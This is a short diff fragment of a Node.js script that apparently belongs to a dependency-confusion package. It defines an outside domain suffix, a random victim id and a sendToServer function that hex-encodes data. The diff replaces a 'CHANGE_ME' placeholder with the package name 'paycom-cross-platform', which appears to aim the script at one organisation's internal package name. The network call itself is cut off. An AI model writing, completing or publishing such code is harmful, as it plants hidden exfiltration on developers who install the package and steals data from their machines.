@@ -38,7 +38,7 @@ const os = require('os');
 const suffix = '70f6bc0a.com';
 const id = Math.random().toString(36).substring(2);
 
-const package = '!!!CHANGE_ME!!!';
+const package = 'paycom-cross-platform';
 
 function sendToServer(data) {
     data = Buffer.from(data).toString('hex');
